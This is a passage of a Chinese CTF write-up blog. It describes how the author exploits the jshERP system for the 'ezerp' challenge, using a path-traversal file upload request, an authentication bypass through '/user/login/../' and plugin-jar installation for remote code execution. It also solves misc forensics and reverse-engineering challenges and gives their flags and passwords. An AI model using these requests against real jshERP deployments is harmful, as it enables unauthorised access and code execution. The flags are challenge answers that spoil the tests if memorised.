+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs xml">POST /jshERP-boot/doc.html/../systemConfig/upload?biz=../../../../../../ HTTP/1.1<br>Host: 10.33.232.182:9999<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Cache-Control: max-age=0<br>X-Access-Token: d22cf07e24434e33a82e43a85be5b0bb_151076<br>Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycrlhXpR4I81QZz0x<br>Origin: http://10.33.232.182<br>Referer: http://10.33.232.182//upload/upload.html<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36<br>Content-Length: 652010<br><br>------WebKitFormBoundarycrlhXpR4I81QZz0x<br>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.jpg&quot;<br>Content-Type: image/jpeg<br><br>xxx<br>------WebKitFormBoundarycrlhXpR4I81QZz0x--<br><br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h6 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h6><p>这个点就有点意思了，在<code>\jshERP-3.1\jshERP-boot\src\main\java\com\jsh\erp\controller\PluginController.java</code>​</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020894.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>用户可以上传一个符合格式的<code>jar</code>​包到这个接口，这里就会通过 <code>uploadPluginAndStart</code>​ 上传加载依赖</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020051.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>那么如果说我们能够传入恶意的<code>jar</code>​是不是就可以进行RCE了呢，那么现在的问题就成了: 如何构造一个恶意的插件是符合上传插件逻辑的</p>
+<p>于是去查找官方文档，找各种资料各种百度各种搜索(这插件也太tmd难写了吧我真无语)</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">https://gitee.com/starblues/springboot-plugin-framework-parent<br>https://www.yuque.com/starblues/spring-brick-3.0.0/vxwgye#gLJ40<br>https://gitee.com/starblues/springboot-plugin-framework-example<br></code></pre></td></tr></table></figure>
+
+<p>找了一个世纪，最后在github上才找到了这篇文章</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/thestyleofme/springboot-plugin-framework-parent">https://github.com/thestyleofme/springboot-plugin-framework-parent</a></p>
+<p>‍</p>
+<p>首先第一步，直接maven全编译打包一遍</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mvn clean package -Dmaven.test.skip=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure>
+
+<p>为什么要整个项目全进行maven解析呢？是因为单个pom.xml解析的话会报这种错误</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020203.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>而整个项目编译则没问题，是因为他写的pom.xml这个找不到指定的依赖写在了该项目的别的分支项目的pom.xml中，所以整体打包的话就没有问题了</p>
+<p>‍</p>
+<p>然后找到对应的插件进行修改</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020360.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>然后再次maven编译下用jadx去检查下对应的字节码文件发现没有问题打包成功了</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020536.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>但是这里有三个问题</p>
+<ol>
+<li>仅仅只是加载类，但是并没有初始化，所以是不会执行静态代码的，但是在下面又存在初始化的路由</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 根据插件路径安装插件。该插件jar必须在服务器上存在。注意: 该操作只适用于生产环境</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> path 插件路径名称</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> 操作结果</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@PostMapping(&quot;/installByPath&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">install</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;path&quot;)</span> String path)</span>&#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span>(pluginOperator.install(Paths.get(path)))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;installByPath success&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;installByPath failure&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        e.printStackTrace();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;installByPath failure : &quot;</span> + e.getMessage();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>所以我们可以用路径的形式直接去访问我们传好的恶意的jar包</p>
+<p>‍</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml">POST /plugin/installByPath HTTP/1.1<br>Host: 10.33.232.182:8080<br>Accept: application/json, text/javascript, */*; q=0.01<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Content-Length: 8<br>Content-Type: application/x-www-form-urlencoded<br>Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1706798797; JSESSIONID=F79B29228D4BD16B61B9C8C87AD9C81D; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1706802472<br>Referer: http://10.33.232.182:8080/index.html<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36<br>X-Requested-With: XMLHttpRequest<br><br>path=Y:\\151076\\basic-example-plugin2-1.0.7.RELEASE.jar<br></code></pre></td></tr></table></figure>
+
+<p>但是他会提示<code>Plugin id can&#39;t be empty</code>​</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020688.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<ol start="2">
+<li>修改<code>MANIFEST.MF</code>​(当然也可以直接用本项目生成好的<code>-with-dependencies.jar</code>​)</li>
+</ol>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">Plugin-Id: basic-example-plugin3<br>Implementation-Version: 1.0.8.RELEASE<br>Plugin-Provider: isaacc<br>Plugin-Version: 1.0.8.RELEASE<br>Plugin-Class: com.basic.example.plugin2.DefinePlugin<br></code></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>要注意的点就是他一定要创建<code>plugins</code>​目录(系统之前已经安装过插件) 才能够将我们传入的jar部署上去</li>
+</ol>
+<p>‍</p>
+<p>满足上述三点 再去初始化发现就加载进去然后弹出计算机了</p>
+<p>‍</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020857.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<h4 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h4><p>‍</p>
+<p>先看提示</p>
+<p>ezerp</p>
+<p>hint1: plugins目录不存在</p>
+<p>hint2: 附件新增一个 <a target="_blank" rel="noopener" href="https://xjlh2024-1308232561.cos.ap-nanjing.myqcloud.com/WEB-ezerp.jar">https://xjlh2024-1308232561.cos.ap-nanjing.myqcloud.com/WEB-ezerp.jar</a></p>
+<p>‍</p>
+<p>首先前面是弱口令admin&#x2F;123456可以进入后台的(所以虽然有权限绕过但是也可以不用)，所以直接看后台的洞即可，找了自己审计的文章和网上最新版本公开的漏洞来对比分析，发现是存在任意文件上传的，但是并不知道web路径而且应该知道这个ERP是不解析jsp的，根据提示说plugins目录不存在,那么就可以通过上传去建立这个文件夹，然后通过上传Jar包来进行依赖的添加来导致RCE</p>
+<p>‍</p>
+<h5 id="权限绕过-但是好像不知道为啥突然弱口令就没了"><a href="#权限绕过-但是好像不知道为啥突然弱口令就没了" class="headerlink" title="权限绕过(但是好像不知道为啥突然弱口令就没了)"></a>权限绕过(但是好像不知道为啥突然弱口令就没了)</h5><p>跟上述讲的一样，看他的拦截器如下</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020373.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>所以只需要带有<code>/user/login/../</code>​即可成功绕过权限了</p>
+<p>什么都不加</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020530.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>加了<code>/user/login/../../</code>​后直接返回200</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020705.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>获取管理员的token</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020857.png" srcset="/img/loading.gif" lazyload alt="image">​​</p>
+<h5 id="文件上传新建文件夹"><a href="#文件上传新建文件夹" class="headerlink" title="文件上传新建文件夹"></a>文件上传新建文件夹</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://1.14.108.193:32014/user/login/../../jshERP-boot/systemConfig/upload?biz=../../../../../../../../../../../../opt/plugins<br></code></pre></td></tr></table></figure>
+
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020015.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<h5 id="直接去install我们上传的jar包"><a href="#直接去install我们上传的jar包" class="headerlink" title="直接去install我们上传的jar包"></a>直接去install我们上传的jar包</h5><p>偷个图</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020160.png!thumbnail" srcset="/img/loading.gif" lazyload>​</p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="2024签到题"><a href="#2024签到题" class="headerlink" title="2024签到题"></a>2024签到题</h3><p>‍</p>
+<p>下载下来看图片详情发暗号即可</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020348.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>‍</p>
+<h3 id="数据安全-easy-tables"><a href="#数据安全-easy-tables" class="headerlink" title="数据安全-easy_tables"></a>数据安全-easy_tables</h3><p>‍</p>
+<p>‍为了方便操作，将csv文件转化为json文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><br><span class="hljs-comment"># 读取CSV文件</span><br>df = pd.read_csv(<span class="hljs-string">&#x27;tables.csv&#x27;</span>)<br><span class="hljs-comment"># 将数据转换为JSON格式</span><br>json_data = df.to_json(<span class="hljs-string">&#x27;tables..json&#x27;</span>, orient=<span class="hljs-string">&#x27;records&#x27;</span>)<br><span class="hljs-comment"># 读取CSV文件</span><br>df = pd.read_csv(<span class="hljs-string">&#x27;permissions.csv&#x27;</span>)<br><span class="hljs-comment"># 将数据转换为JSON格式</span><br>json_data = df.to_json(<span class="hljs-string">&#x27;permissions.json&#x27;</span>, orient=<span class="hljs-string">&#x27;records&#x27;</span>)<br><br><span class="hljs-comment"># 读取CSV文件</span><br>df = pd.read_csv(<span class="hljs-string">&#x27;users.csv&#x27;</span>)<br><span class="hljs-comment"># 将数据转换为JSON格式</span><br>json_data = df.to_json(<span class="hljs-string">&#x27;users.json&#x27;</span>, orient=<span class="hljs-string">&#x27;records&#x27;</span>)<br><span class="hljs-comment"># 读取CSV文件</span><br>df = pd.read_csv(<span class="hljs-string">&#x27;actionlog.csv&#x27;</span>)<br><span class="hljs-comment"># 将数据转换为JSON格式</span><br>json_data = df.to_json(<span class="hljs-string">&#x27;actionlog.json&#x27;</span>, orient=<span class="hljs-string">&#x27;records&#x27;</span>)<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020512.png" srcset="/img/loading.gif" lazyload alt="image-20240131142445029">​</p>
+<p>‍</p>
+<p>‍</p>
+<p>‍根据指引的意思进行数据处理</p>
+<p>tables.json 数据库的允许的操作时间，判断是否存在违规操作时间的行为</p>
+<p>actionlog.json操作者的行为记录</p>
+<p>permissions.json 操作权限信息表</p>
+<p>users.json  操作人是否存在，记录操作者信息</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DataProcessor</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, action_log_path, user_path, table_path, permission_path</span>):<br>        self.action_logs = pd.read_json(action_log_path)<br>        self.users = pd.read_json(user_path)<br>        self.tables = pd.read_json(table_path)<br>        self.permissions = pd.read_json(permission_path)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user_info</span>(<span class="hljs-params">self, username</span>):<br>        user_row = self.users[self.users[<span class="hljs-string">&#x27;账号&#x27;</span>] == username]<br>        <span class="hljs-keyword">if</span> user_row.empty:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> user_row.iloc[<span class="hljs-number">0</span>]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_table_info</span>(<span class="hljs-params">self, table_name</span>):<br>        table_row = self.tables[self.tables[<span class="hljs-string">&#x27;表名&#x27;</span>] == table_name]<br>        <span class="hljs-keyword">if</span> table_row.empty:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> table_row.iloc[<span class="hljs-number">0</span>]<br>  <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_permission_info</span>(<span class="hljs-params">self, group_id</span>):<br>        permission_row = self.permissions[self.permissions[<span class="hljs-string">&#x27;编号&#x27;</span>] == group_id]<br>        <span class="hljs-keyword">if</span> permission_row.empty:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> permission_row.iloc[<span class="hljs-number">0</span>]<br>  <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">time_in_range</span>(<span class="hljs-params">self, time_str, start, end</span>):<br>        current = datetime.strptime(time_str, <span class="hljs-string">&#x27;%H:%M:%S&#x27;</span>)<br>        start_time = datetime.strptime(start, <span class="hljs-string">&#x27;%H:%M:%S&#x27;</span>)<br>        end_time = datetime.strptime(end, <span class="hljs-string">&#x27;%H:%M:%S&#x27;</span>)<br>        <span class="hljs-keyword">return</span> start_time &lt;= current &lt;= end_time<br>  <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">analyze_logs</span>(<span class="hljs-params">self</span>):<br>        flags = []<br>        <span class="hljs-keyword">for</span> _, action_log <span class="hljs-keyword">in</span> self.action_logs.iterrows():<br>            user_info = self.get_user_info(action_log[<span class="hljs-string">&#x27;账号&#x27;</span>])<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user_info:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;action_log[<span class="hljs-string">&#x27;编号&#x27;</span>]&#125;</span> 用户不存在 0_0_0_<span class="hljs-subst">&#123;action_log[<span class="hljs-string">&#x27;编号&#x27;</span>]&#125;</span>&quot;</span>)<br>                flags.append(<span class="hljs-string">f&quot;0_0_0_<span class="hljs-subst">&#123;action_log[<span class="hljs-string">&#x27;编号&#x27;</span>]&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">continue</span><br>        <br>            action = re.search(<span class="hljs-string">r&#x27;\b(insert|update|delete|select)\s(\S+)&#x27;</span>, action_log[<span class="hljs-string">&#x27;执行操作&#x27;</span>], re.IGNORECASE)<br>            <span class="hljs-keyword">if</span> action:<br>                table_info = self.get_table_info(action.group(<span class="hljs-number">2</span>))<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> table_info:<br>                    <span class="hljs-keyword">continue</span><br><br>                permission_info = self.get_permission_info(user_info[<span class="hljs-string">&#x27;所属权限组编号&#x27;</span>])<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> permission_info:<br>                    <span class="hljs-keyword">continue</span><br><br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>(table_info[<span class="hljs-string">&#x27;编号&#x27;</span>]) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> permission_info[<span class="hljs-string">&#x27;可操作表编号&#x27;</span>].split(<span class="hljs-string">&#x27;,&#x27;</span>):<br>                    flags.append(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;user_info[<span class="hljs-string">&#x27;编号&#x27;</span>]&#125;</span>_<span class="hljs-subst">&#123;user_info[<span class="hljs-string">&#x27;所属权限组编号&#x27;</span>]&#125;</span>_<span class="hljs-subst">&#123;table_info[<span class="hljs-string">&#x27;编号&#x27;</span>]&#125;</span>_<span class="hljs-subst">&#123;action_log[<span class="hljs-string">&#x27;编号&#x27;</span>]&#125;</span>&quot;</span>)<br>                    <span class="hljs-keyword">continue</span><br><br>                <span class="hljs-keyword">if</span> action_log[<span class="hljs-string">&#x27;执行操作&#x27;</span>].split()[<span class="hljs-number">0</span>].lower() <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> permission_info[<span class="hljs-string">&#x27;可操作权限&#x27;</span>].split(<span class="hljs-string">&#x27;,&#x27;</span>):<br>                    flags.append(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;user_info[<span class="hljs-string">&#x27;编号&#x27;</span>]&#125;</span>_<span class="hljs-subst">&#123;user_info[<span class="hljs-string">&#x27;所属权限组编号&#x27;</span>]&#125;</span>_<span class="hljs-subst">&#123;table_info[<span class="hljs-string">&#x27;编号&#x27;</span>]&#125;</span>_<span class="hljs-subst">&#123;action_log[<span class="hljs-string">&#x27;编号&#x27;</span>]&#125;</span>&quot;</span>)<br>                    <span class="hljs-keyword">continue</span><br><br>                time_ranges = table_info[<span class="hljs-string">&#x27;可操作时间段(时:分:秒)&#x27;</span>].split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">any</span>(self.time_in_range(action_log[<span class="hljs-string">&#x27;操作时间&#x27;</span>][-<span class="hljs-number">8</span>:], *r.split(<span class="hljs-string">&quot;~&quot;</span>)) <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> time_ranges):<br>                    flags.append(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;user_info[<span class="hljs-string">&#x27;编号&#x27;</span>]&#125;</span>_<span class="hljs-subst">&#123;user_info[<span class="hljs-string">&#x27;所属权限组编号&#x27;</span>]&#125;</span>_<span class="hljs-subst">&#123;table_info[<span class="hljs-string">&#x27;编号&#x27;</span>]&#125;</span>_<span class="hljs-subst">&#123;action_log[<span class="hljs-string">&#x27;编号&#x27;</span>]&#125;</span>&quot;</span>)<br><br>        flags.sort(key=<span class="hljs-keyword">lambda</span> x: <span class="hljs-built_in">int</span>(x.split(<span class="hljs-string">&#x27;_&#x27;</span>)[<span class="hljs-number">0</span>]))<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;,&quot;</span>.join(flags)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    processor = DataProcessor(<span class="hljs-string">&quot;actionlog.json&quot;</span>, <span class="hljs-string">&quot;users.json&quot;</span>, <span class="hljs-string">&quot;tables.json&quot;</span>, <span class="hljs-string">&quot;permissions.json&quot;</span>)<br>    result = processor.analyze_logs()<br>    <span class="hljs-built_in">print</span>(result)<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020670.png" srcset="/img/loading.gif" lazyload alt="image-20240131160845686">​</p>
+<p>‍</p>
+<p>md5生成flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">import hashlib<br><br><span class="hljs-comment"># 定义要转换的字符串</span><br>text = <span class="hljs-string">&quot;0_0_0_6810,0_0_0_8377,6_14_91_6786,7_64_69_3448,9_18_61_5681,30_87_36_235,31_76_85_9617,49_37_30_8295,75_15_43_8461,79_3_15_9011&quot;</span><br><br><span class="hljs-comment"># 使用hashlib库生成MD5哈希值</span><br>md5_hash = hashlib.md5(text.encode()).hexdigest()<br><br><span class="hljs-built_in">print</span>(md5_hash)<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020827.png" srcset="/img/loading.gif" lazyload alt="image-20240131162423336">​</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">flag&#123;271b1ffebf7a76080c7a6e134ae4c929&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="easy-rawraw"><a href="#easy-rawraw" class="headerlink" title="easy_rawraw"></a>easy_rawraw</h3><p>‍</p>
+<p>‍</p>
+<p>‍‍passware kit 可以得到用户的密码，密码1</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">ADMIN<span class="hljs-string">\Administrator</span>  das123admin321<br></code></pre></td></tr></table></figure>
+
+<p>既然和密码有关，vol搜密码</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020973.png" srcset="/img/loading.gif" lazyload alt="image-20240131155404262">​</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020142.png" srcset="/img/loading.gif" lazyload alt="image-20240131155707574">​</p>
+<p>‍</p>
+<p>‍</p>
+<p>‍导出压缩包后解压，分离png，根据备注猜测密码20240210，拿到pass.txt，密码2</p>
+<p>卡了很久无果，让学弟用010搜下password</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020307.png" srcset="/img/loading.gif" lazyload alt="image-20240131160111228">​</p>
+<p>找到了密码</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">DasrIa<span class="hljs-number">456</span>sAdmI<span class="hljs-symbol">n987</span><br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>‍使用这个密码解密rar</p>
+<p>加上pslist看到了VeraCrypt，搭配密码2挂载解密，得到xlsx</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020462.png" srcset="/img/loading.gif" lazyload alt="image-20240131160358647">​</p>
+<p>最后使用密码1得到flag</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020605.png" srcset="/img/loading.gif" lazyload alt="image-20240131160309740">​</p>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><p>‍</p>
+<h3 id="MZ"><a href="#MZ" class="headerlink" title="MZ"></a>MZ</h3><p>‍</p>
+<p>IDA反编译打开</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020758.png" srcset="/img/loading.gif" lazyload alt="image-20240131165525325">​</p>
+<p>内容比较简单，首先要求输入48位长度的字符串，然后通过字符串的ASCII值查表判断，<br>过了判断后，下边还有个MD4用于验证字符串的正确性。<br>通过调试把表格扒下来，然后编写脚本，看得出来需要使用回溯算法来确定，但是我搓了半个小时没搞出来，然后只能自己手动。<br>脚本如下：</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020912.png" srcset="/img/loading.gif" lazyload alt="image-20240131165537086">​</p>
+<p>中间手动探索过程省略。。。。</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020431.jpg" srcset="/img/loading.gif" lazyload alt="img">​</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020575.jpg" srcset="/img/loading.gif" lazyload alt="img">​</p>
+<p>这道题还有一个关键信息是flag是一个有意义的字符串，也就是说看起来像个句子，通过这个在手动判断的时候先找看着像的，不行再手动回溯。<br>值得一提的时候最后两个字符会有区别，需要通过MD4来判断<br>flag：Somet1mes_ch0ice_i5_more_import@nt_tHan_effort~!</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020728.png" srcset="/img/loading.gif" lazyload alt="image-20240131165613367">​</p>
